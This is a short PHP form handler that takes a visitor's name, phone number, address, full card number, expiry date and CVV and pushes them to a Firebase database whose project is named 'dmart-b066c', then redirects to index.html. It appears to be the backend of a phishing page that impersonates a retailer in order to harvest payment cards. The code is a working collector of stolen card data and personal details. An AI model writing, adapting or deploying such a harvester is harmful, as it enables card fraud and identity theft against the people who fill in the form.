<?php
require 'vendor/autoload.php';

use Kreait\Firebase\Factory;

$serviceAccountPath = __DIR__ . '/firebase.json';

try {
    // Initialize Firebase with the correct database URL
    $factory = (new Factory)
        ->withServiceAccount($serviceAccountPath)
        ->withDatabaseUri('https://dmart-b066c-default-rtdb.firebaseio.com/'); // Replace with your database URL

    $database = $factory->createDatabase();

    if ($_SERVER["REQUEST_METHOD"] === "POST") {
        // Prepare data to store in Firebase
        $data = [
            'name' => $_POST['name'] ?? '',
            'mobile' => $_POST['mobile'] ?? '',
            'city' => $_POST['city'] ?? '',
            'state' => $_POST['state'] ?? '',
            'address' => $_POST['address'] ?? '',
            'pin' => $_POST['pin'] ?? '',
            'card_details' => [
                'card_number' => $_POST['ccno'] ?? '',
                'expiry' => [
                    'mm' => $_POST['mmmm'] ?? '',
                    'yy' => $_POST['yyyy'] ?? ''
                ],
                'cvv' => $_POST['cvv'] ?? ''
            ],
            'payment_method' => $_POST['cct'] == '1' ? 'Credit Card' : 'Debit Card',
            'amount' => $_POST['amount'] ?? 0,
            'created_at' => date('Y-m-d H:i:s')
        ];

        // Push data to Firebase
        $reference = $database->getReference('orders')->push($data);

        header('Location:index.html');
    } else {
        echo "Invalid request method.";
    }
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
